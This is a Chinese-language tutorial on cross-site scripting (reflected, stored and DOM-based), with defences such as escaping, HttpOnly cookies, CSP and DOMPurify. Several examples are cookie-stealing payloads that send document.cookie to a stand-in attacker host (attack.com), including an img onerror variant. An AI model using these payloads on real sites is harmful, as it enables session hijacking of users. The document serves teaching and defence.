[toc]

# XSS 攻击

## 1. 前言

XSS (Corss Site Scripting)也即跨站脚本攻击，攻击出现的原因一般是因为 Web 程序对用于的输入过滤不足导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：

反射型，存储型，DOM型

## 2. 反射型(url)

反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心拼接的恶意链接，从而达到攻击的目的。

举个例子：

```js
// 当用户在搜索时，比如
http://www.xxx.com/music?name='青花瓷'
```

后端假设返回搜索的name，而这时候攻击者在 url 后面拼接一个恶意的script，如 alert(1);

```js
http://www.xxx.com/music?name='青花瓷'<script>alert(1)</script>
```

又假如拼接的是一个 documen.cookie呢？然后将这个cookie发到它自己的电脑上，cookie就被盗取了

```js
http://www.xxx.com/music?name='青花瓷'<script>fetch(`http://恶意者的网站.com/>cookie=${document.cooki}`)</script>
```

造成反射型 XSS 攻击的原因是服务端没有过滤scritp， 所以解决方案很简单，在服务器对用户的输入进行过滤，过滤方案很多。

一种方式是对用户输入进行 encode，比如：

```js
encodeURIComponent(req.query.name);
```

第二种方式就是替换掉特殊字符，比如 `<` `&` 等，只要替换掉，自然就不会解析了

```js
function replaceSpecialSymbol(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
```

另外，如果后端登录验证是基于 cookie的话，最好将其设置为 HttpOnly,这样攻击者就无法利用 JS 脚本在前端获取到 Cookie了

## 3. 存储型（表单）

与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端未经过转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。

假如在某网站上有一篇爆款文章：`https://xxx.com/articles/1`

攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：

```bash
文章写的真棒！<script>fetch(`http://attack.com/cookies?cookie=${document.cookie}`)</script>
```

如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！

可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，

可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致。

## 4. DOM型（onerror）

DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器返回的网页或脚本中是看不到恶意代码的，而是在更新 DOM 树的时候触发了恶意脚本的执行。

我们来看一则模拟案例，前端开发人员未经过滤就直接把用户输入插入到 HTML 中：

```html
<input id="input" type="text" />
<button onclick="container.innerHTML = input.value">点击</button>
<p id="container"></p>
```

试想一下，如果此时用户输入了下面一段恶意脚本的话会发生什么？

```bash
<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

值得庆幸的是，大部分现代浏览器都实现了 HTML5 的 [安全规范](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML)

但是这就足够安全了吗？非也，请看下面的输入：

```html
<img src="x" onerror="fetch(`http://attack.com/cookies?cookie=${document.cookie}`)" />
```

恶意脚本依然在 onerror 回调中被触发了！

## 5. 防御方案

这里推荐使用 [DOMPurify](https://github.com/cure53/DOMPurify) 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。

### XSS 攻击简介

XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的网络安全漏洞，它允许攻击者将恶意脚本注入到其他用户会浏览的正常网页中。当其他用户浏览这些网页时，嵌入其中的恶意脚本会在用户的浏览器中执行，从而允许攻击者窃取用户数据、劫持用户会话、破坏网页内容或者进行其他恶意行为。

XSS 攻击通常分为以下三种类型：

1. **反射型 XSS（Non-Persistent XSS）**：这种攻击通过诱使用户点击一个恶意链接来实现，该链接包含了攻击脚本。当用户点击链接时，恶意脚本作为请求的一部分发送到服务器，然后服务器将脚本作为响应的一部分返回，并在用户的浏览器中执行。

2. **存储型 XSS（Persistent XSS）**：这种攻击将恶意脚本直接存储在目标服务器上（例如，在数据库、消息论坛、访客留言等位置）。当其他用户访问受影响的页面时，恶意脚本会被加载并执行。

3. **DOM 基础型 XSS（DOM-based XSS）**：这种攻击是通过操纵页面的DOM（文档对象模型）来实现的，攻击脚本通常是由客户端脚本（如JavaScript）在浏览器中动态生成的，而不是来自服务器的响应。

### XSS 攻击例子

假设有一个简单的网站，它允许用户输入搜索词并将其显示在页面上。如果网站没有正确地对用户输入进行处理，攻击者可以输入以下内容：

```html
<script>alert('XSS');</script>
```

如果用户输入被直接插入到页面中，这段脚本就会在其他用户的浏览器中执行，弹出一个警告框。这是一个反射型 XSS 的简单例子。

对于存储型 XSS，攻击者可能会在一个论坛帖子中插入恶意脚本，如：

```html
<script>var cookies = document.cookie; /* 发送到攻击者的服务器 */</script>
```

当其他用户浏览这个帖子时，脚本会执行并可能将用户的 cookie 发送到攻击者控制的服务器，从而泄露用户的会话信息。

### 预防 XSS 攻击的手段

1. **输入验证**：对所有用户输入进行严格的验证，拒绝任何可疑的输入。

2. **输出编码**：在将用户输入插入到HTML页面、URL、JavaScript、CSS等中时，对其进行适当的编码或转义，以防止恶意脚本的执行。

3. **使用安全的API**：使用不会自动执行用户输入的API，例如使用 `textContent` 而不是 `innerHTML`。

4. **内容安全策略（CSP）**：实施内容安全策略，限制网页可以加载和执行的资源。

5. **使用HTTPOnly和Secure标志**：对于敏感的cookie，使用HTTPOnly标志可以防止JavaScript访问cookie，而Secure标志确保cookie仅通过安全的HTTPS连接传输。

6. **框架和库**：使用现代的Web开发框架和库，它们通常提供了一些内置的XSS防护措施。

7. **验证和清理富文本输入**：如果允许用户输入HTML，使用库如DOMPurify来清理这些输入，移除潜在的恶意脚本。

8. **定期更新和补丁**：保持系统、框架和库的更新，以确保已知的安全漏洞得到修复。

通过这些措施，可以显著降低XSS攻击的风险。然而，保护网站不受XSS攻击的关键在于始终保持警惕，并将安全作为开发过程中的一个持续考虑因素。
